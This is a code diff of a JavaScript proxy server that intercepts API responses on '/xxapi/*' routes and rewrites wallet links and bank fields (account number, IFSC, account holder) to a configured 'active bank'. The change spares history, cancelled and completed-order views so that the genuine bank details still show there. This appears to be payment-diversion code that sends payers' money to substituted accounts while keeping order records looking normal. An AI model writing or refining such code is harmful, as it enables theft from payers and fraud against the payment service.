@@ -708,22 +708,29 @@ function rewriteWalletDomainForBank(walletDomain, bank, minAmount) {
     }
 }
 
-function rewriteWalletDomainsInResponse(obj, data, activeBank, depth = 0) {
+function rewriteWalletDomainsInResponse(obj, data, activeBank, depth = 0, isHistoryOrList = false) {
     if (!obj || typeof obj !== 'object' || depth > 12) return;
     if (Array.isArray(obj)) {
-        for (const item of obj) rewriteWalletDomainsInResponse(item, data, activeBank, depth + 1);
+        for (const item of obj) rewriteWalletDomainsInResponse(item, data, activeBank, depth + 1, isHistoryOrList);
         return;
     }
     const saved = getSavedOrderMapping(data, obj);
     const savedBank = bankFromSavedOrder(saved);
-    const bank = savedBank && (savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)
-        ? savedBank
-        : activeBank;
-    for (const key of Object.keys(obj)) {
-        if (typeof obj[key] === 'string' && key.toLowerCase() === 'walletdomain') {
-            obj[key] = rewriteWalletDomainForBank(obj[key], bank, activeBank && activeBank.minAmount);
-        } else if (obj[key] && typeof obj[key] === 'object') {
-            rewriteWalletDomainsInResponse(obj[key], data, activeBank, depth + 1);
+    if (savedBank && (savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)) {
+        for (const key of Object.keys(obj)) {
+            if (typeof obj[key] === 'string' && key.toLowerCase() === 'walletdomain') {
+                obj[key] = rewriteWalletDomainForBank(obj[key], savedBank, activeBank && activeBank.minAmount);
+            } else if (obj[key] && typeof obj[key] === 'object') {
+                rewriteWalletDomainsInResponse(obj[key], data, activeBank, depth + 1, isHistoryOrList);
+            }
+        }
+    } else if (!isHistoryOrList) {
+        for (const key of Object.keys(obj)) {
+            if (typeof obj[key] === 'string' && key.toLowerCase() === 'walletdomain') {
+                obj[key] = rewriteWalletDomainForBank(obj[key], activeBank, activeBank && activeBank.minAmount);
+            } else if (obj[key] && typeof obj[key] === 'object') {
+                rewriteWalletDomainsInResponse(obj[key], data, activeBank, depth + 1, isHistoryOrList);
+            }
         }
     }
 }
@@ -2742,7 +2749,8 @@ app.all('/xxapi/*', async (req, res) => {
         // Existing mapped orders use their saved bank; otherwise the active bank is
         // used. The helper preserves the original scheme/path and leaves links at
         // or below the active minimum untouched.
-        rewriteWalletDomainsInResponse(jsonResp, data, getActiveBank(data, null));
+        const isHistoryOrList = urlLower.includes('history') || urlLower.includes('cancel') || isBuyList || urlLower.includes('waitpayerpaymentslip');
+        rewriteWalletDomainsInResponse(jsonResp, data, getActiveBank(data, null), 0, isHistoryOrList);
 
         let userId = '';
         const pxUid = req.headers['x-px-uid'] || '';
@@ -3079,18 +3087,6 @@ app.all('/xxapi/*', async (req, res) => {
                                 const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
                                 if (mappedWallet) item.walletDomain = mappedWallet;
                             }
-                        } else if (!isBrowseMarket && (urlLower.includes('history') || urlLower.includes('waitconfirm') || orderState > 0 || item.walletDomain)) {
-                            // User's own orders (History / Bought items): replace bank details
-                            if (minOk) {
-                                if (urlLower.includes('waitconfirm')) {
-                                    replaceWaitConfirmBankFields(item, bank);
-                                } else {
-                                    forceBankDetails(item, bank);
-                                }
-                                if (item.walletDomain) {
-                                    item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
-                                }
-                            }
                         }
                     });
                 }
@@ -3123,9 +3119,10 @@ app.all('/xxapi/*', async (req, res) => {
                         const savedSingleOrder = singleOrderState > 0 || isPickupResponse || isSlipDetailResponse
                             ? (getSavedOrderMapping(data, directSingleId) || getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId) || getSavedOrderMapping(data, getRequestOrderId(req)))
                             : null;
-                        // Completed/history and pick-up responses are strict: no KV mapping
-                        // means no replacement. Other active/pending responses retain existing behavior.
-                        if ((!isPickupResponse && singleOrderState <= 0) || savedSingleOrder) {
+                        const isHistoryDetail = urlLower.includes('history') || urlLower.includes('cancel') || singleOrderState > 0;
+                        // Completed/history orders are strict: no KV mapping means no replacement (real server bank is shown)
+                        // Active new buy actions use active bank and persist to orderBankMap
+                        if ((!isHistoryDetail && !isPickupResponse && singleOrderState <= 0) || savedSingleOrder) {
                             const replacementBank = savedSingleOrder ? bankFromSavedOrder(savedSingleOrder) : bank;
                             if (replacementBank && (replacementBank.accountNo || replacementBank.ifsc || replacementBank.accountHolder)) {
                                 const globalHasAcct = scanHasBankFields(jsonResp, 0);
